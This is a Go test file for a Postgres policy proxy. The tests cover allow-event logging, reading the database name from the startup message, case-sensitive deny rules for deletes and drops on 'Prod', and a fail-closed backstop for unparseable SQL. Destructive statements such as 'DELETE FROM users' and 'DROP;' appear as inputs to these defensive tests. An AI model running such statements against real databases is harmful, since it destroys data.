// TestPgEvaluateEmitsAllowOnNoMatch nails down the dashboard logging
// fix: an endpoint with zero rules (or one whose rules don't match
// the current query) still emits an `allow` event so the query
// shows up in the actions tab. Without this, postgres connections
// to permissive endpoints were invisible to operators — the runtime
// previously short-circuited on `cr == nil`.
func TestPgEvaluateEmitsAllowOnNoMatch(t *testing.T) {
	var events []runtime.ConnEvent
	ch := &runtime.ConnHandle{
		Endpoint: &config.CompiledEndpoint{
			Name:   "pg-test",
			Family: "sql",
			// Rules is nil — no rule will fire.
		},
		Emit: func(ev runtime.ConnEvent) { events = append(events, ev) },
	}
	if v, _ := pgEvaluate(ch, "SELECT 1", "", ""); v != "" {
		t.Errorf("verdict %q, want empty (allow)", v)
	}
	if len(events) != 1 {
		t.Fatalf("got %d events, want 1: %+v", len(events), events)
	}
	if events[0].Action != "allow" {
		t.Errorf("Action = %q, want allow", events[0].Action)
	}
	if events[0].Verb != "select" {
		t.Errorf("Verb = %q, want select", events[0].Verb)
	}
}

// TestPgStartupParamExtractsDatabase confirms pgStartupParam pulls
// the `database` parameter out of a postgres v3 StartupMessage,
// which is how the wire frontend learns the session-scoped database
// name to stamp on every subsequent match.Request.Meta.
func TestPgStartupParamExtractsDatabase(t *testing.T) {
	body := buildPgStartupBody(map[string]string{
		"user":             "alice",
		"database":         "Prod",
		"application_name": "psql",
	})
	if got := pgStartupParam(body, "database"); got != "Prod" {
		t.Errorf("pgStartupParam(database) = %q, want %q", got, "Prod")
	}
	if got := pgStartupParam(body, "user"); got != "alice" {
		t.Errorf("pgStartupParam(user) = %q, want %q", got, "alice")
	}
	if got := pgStartupParam(body, "missing"); got != "" {
		t.Errorf("pgStartupParam(missing) = %q, want empty", got)
	}
}

// buildPgStartupBody assembles a synthetic v3 StartupMessage body in
// the shape pgStartupParam parses: 4-byte length + 4-byte protocol
// version + alternating null-terminated key/value strings + trailing
// null. The 8-byte head matches what HandleConn pulls off the wire.
func buildPgStartupBody(params map[string]string) []byte {
	var payload []byte
	for k, v := range params {
		payload = append(payload, []byte(k)...)
		payload = append(payload, 0)
		payload = append(payload, []byte(v)...)
		payload = append(payload, 0)
	}
	payload = append(payload, 0)
	body := make([]byte, 8+len(payload))
	binary.BigEndian.PutUint32(body[:4], uint32(len(body)))
	binary.BigEndian.PutUint32(body[4:8], 196608)
	copy(body[8:], payload)
	return body
}

// TestPgEvaluateThreadsDatabaseIntoMeta verifies that the database
// argument to pgEvaluate lands on the *sqlfacet.Meta the matcher
// reads, by wiring a rule whose CEL condition fires only when
// sql.database == "Prod". Case-sensitive: "prod" must NOT fire.
func TestPgEvaluateThreadsDatabaseIntoMeta(t *testing.T) {
	condition := `sql.database == "Prod" && sql.verb == "delete"`
	m, err := facet.NewMatcher("sql", condition)
	if err != nil {
		t.Fatalf("matcher: %v", err)
	}
	ep := &config.CompiledEndpoint{
		Name: "pg-test", Family: "sql",
		Rules: []*config.CompiledRule{{
			Name:    "prod-no-delete",
			Matcher: m,
			Outcome: config.Outcome{Verdict: "deny", Reason: "prod is read-only"},
		}},
	}
	ch := &runtime.ConnHandle{Endpoint: ep, Emit: func(runtime.ConnEvent) {}}

	if v, _ := pgEvaluate(ch, "DELETE FROM users", "", "Prod"); v != "deny" {
		t.Errorf("DELETE on Prod verdict = %q, want deny", v)
	}
	if v, _ := pgEvaluate(ch, "DELETE FROM users", "", "prod"); v != "" {
		t.Errorf("DELETE on prod (lowercase) verdict = %q, want allow", v)
	}
	if v, _ := pgEvaluate(ch, "DELETE FROM users", "", ""); v != "" {
		t.Errorf("DELETE with empty database verdict = %q, want allow", v)
	}
	if v, _ := pgEvaluate(ch, "SELECT 1", "", "Prod"); v != "" {
		t.Errorf("SELECT on Prod verdict = %q, want allow (verb mismatch)", v)
	}
}

// TestPgEvaluateUnparseableBackstopDeny pins the wiring of
// runtime.MatchRequestFailClosed through pgEvaluateInfo: an
// unparseable statement whose only rule resolves via absorption
// (`unknown && false == false` → NoMatch) must NOT ride the
// implicit-allow default — the backstop denies because the endpoint
// declares rules and the bytes were uninspectable.
func TestPgEvaluateUnparseableBackstopDeny(t *testing.T) {
	ep := pgEndpointFromHCL(t, `
endpoint "postgres" "db" {
  host = "db.example.com:5432"
}
credential "postgres_credential" "db-cred" { endpoint = postgres.db }
profile "default" { credentials = [postgres_credential.db-cred] }

rule "deny-prod-drops" {
  endpoint  = postgres.db
  condition = "sql.verb == 'drop' && sql.database == 'prod'"
  verdict   = "deny"
}
`)
	ch := &runtime.ConnHandle{
		Endpoint: ep,
		Emit:     func(runtime.ConnEvent) {},
	}
	// Unparseable piece, database 'dev': the rule absorbs to false,
	// no rule matches, the backstop denies.
	v, reason := pgEvaluate(ch, "DROP;", "", "dev")
	if v != "deny" {
		t.Fatalf("pgEvaluate(\"DROP;\", db=dev) verdict = %q reason = %q, want backstop deny", v, reason)
	}
	if !strings.Contains(reason, "unparseable") {
		t.Errorf("reason = %q, want it to name the cause", reason)
	}
	// A parseable SELECT against the same endpoint still falls
	// through to implicit allow — the backstop only guards
	// uninspectable requests.
	v, reason = pgEvaluate(ch, "SELECT 1", "", "dev")
	if v != "" {
		t.Fatalf("pgEvaluate(\"SELECT 1\") verdict = %q reason = %q, want implicit allow", v, reason)
	}
}
